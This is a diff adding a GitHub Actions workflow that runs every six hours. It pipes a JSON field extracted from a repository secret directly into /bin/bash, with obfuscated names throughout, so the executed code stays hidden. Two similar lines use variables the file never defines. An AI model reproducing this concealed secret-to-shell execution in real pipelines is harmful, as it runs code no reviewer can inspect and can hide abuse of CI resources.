@@ -1,0 +1,20 @@
+name: zongjueshi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zongjueshi
+        env:
+          giy22909: ${{ secrets.giy22909 }}
+        run: |
+          echo $giy22909 | jq -r .hl098 | /bin/bash
+          echo $vyf14540 | jq -r .h5 | /bin/bash
+          echo $tupf4 | jq -r .nnvr01101 | /bin/bash
+
